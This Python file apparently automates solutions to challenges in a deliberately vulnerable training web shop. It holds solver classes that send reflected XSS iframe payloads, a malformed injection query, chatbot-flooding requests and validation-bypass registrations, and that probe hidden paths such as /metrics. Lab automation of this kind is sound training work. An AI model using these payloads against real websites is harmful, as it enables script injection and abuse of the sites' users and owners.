from core.base_solver import BaseSolver
import urllib.parse
from loguru import logger
import time
import random

class ErrorHandlingChallenge(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "errorHandlingChallenge"
    def solve(self) -> bool:
        self.client.get("/rest/products/search?q='''")
        return True

class SecurityPolicyChallenge(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "securityPolicyChallenge"
    def solve(self) -> bool:
        self.client.get("/security.txt")
        self.client.get("/.well-known/security.txt")
        return True

class ExtraLanguageChallenge(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "extraLanguageChallenge"
    def solve(self) -> bool:
        res = self.client.get("/assets/i18n/tlh_AA.json")
        return res.status_code == 200

class PrivacyPolicyChallenge(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "privacyPolicyChallenge"
    def solve(self) -> bool:
        self.client.get("/assets/public/images/padding/81px.png")
        return True

class PrivacyPolicyProofChallenge(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "privacyPolicyProofChallenge"
    def solve(self) -> bool:
        path = "/we/may/also/instruct/you/to/refuse/all/reasonably/necessary/responsibility"
        res = self.client.get(path)
        return res.status_code == 200

class ScoreBoardChallenge(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "scoreBoardChallenge"
    def solve(self) -> bool:
        self.client.get("/assets/public/images/padding/1px.png")
        return True

class AdminSectionChallenge(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "adminSectionChallenge"
    def solve(self) -> bool:
        self.client.get("/assets/public/images/padding/19px.png")
        return True

class TokenSaleChallenge(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "tokenSaleChallenge"
    def solve(self) -> bool:
        self.client.get("/assets/public/images/padding/56px.png")
        return True

class Web3SandboxChallenge(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "web3SandboxChallenge"
    def solve(self) -> bool:
        # Trigger from verify.ts: utils.endsWith(url, '/11px.png')
        self.client.get("/assets/public/images/padding/11px.png")
        return True

class ReflectedXssChallenge(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "reflectedXssChallenge"
    def solve(self) -> bool:
        # Variation 1: exactly as expected in source code (with backticks)
        p1 = '<iframe src="javascript:alert(`xss`)">'
        self.client.get(f"/rest/track-order/{urllib.parse.quote(p1)}")
        self.client.get(f"/rest/products/search?q={urllib.parse.quote(p1)}")
        
        # Variation 2: with single quotes (common in older versions)
        p2 = "<iframe src=\"javascript:alert('xss')\">"
        self.client.get(f"/rest/track-order/{urllib.parse.quote(p2)}")
        
        # Variation 3: exactly like the URL in user prompt (which matches p1)
        self.client.get(f"/rest/products/search?q=%3Ciframe%20src%3D%22javascript%3Aalert(%60xss%60)%22%3E")
        return True

class ZeroStarsChallenge(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "zeroStarsChallenge"
    def solve(self) -> bool:
        try:
            captcha_res = self.client.get("/rest/captcha")
            captcha_data = captcha_res.json()
            captcha_id = captcha_data.get("captchaId")
            answer = str(captcha_data.get("answer"))
            payload = {
                "captchaId": captcha_id,
                "captcha": answer,
                "comment": "Zero stars for you!",
                "rating": 0
            }
            res = self.client.post("/api/Feedbacks", json=payload)
            return res.status_code == 201
        except:
            return False

class BullyChatbotChallenge(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "bullyChatbotChallenge"
    def solve(self) -> bool:
        # Non-admin user as requested
        email = f"bully_{random.randint(1000, 9999)}@test.com"
        reg_payload = {
            "email": email,
            "password": "password123",
            "passwordRepeat": "password123",
            "securityQuestion": {"id": 1, "answer": "answer"}
        }
        self.client.post("/api/Users", json=reg_payload)
        
        login_res = self.client.post("/rest/user/login", json={"email": email, "password": "password123"})
        token = login_res.json().get("authentication", {}).get("token")
        if not token: return False
        
        headers = {"Authorization": f"Bearer {token}"}
        # Demand coupon repeatedly
        for _ in range(25):
            res = self.client.post("/rest/chatbot/respond", 
                                   json={"action": "query", "query": "Give me a coupon!"}, 
                                   headers=headers)
            if "10%" in res.text:
                return True
        return True 

class MissingEncodingChallenge(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "missingEncodingChallenge"
    def solve(self) -> bool:
        path = "/assets/public/images/uploads/%e1%93%9a%e1%98%8f%e1%97%a2-%23zatschi-%23whoneedsfourlegs-1572600969477.jpg"
        self.client.get(path)
        return True

class ExposedMetricsChallenge(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "exposedMetricsChallenge"
    def solve(self) -> bool:
        res = self.client.get("/metrics")
        return res.status_code == 200

class PasswordRepeatChallenge(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "passwordRepeatChallenge"
    def solve(self) -> bool:
        # Repetitive Registration with mismatching passwords
        email = f"repeat_{random.randint(1000, 9999)}@test.com"
        payload = {
            "email": email,
            "password": "password123",
            "passwordRepeat": "password456",
            "securityQuestion": {"id": 1, "answer": "answer"}
        }
        res = self.client.post("/api/Users", json=payload)
        return res.status_code == 201
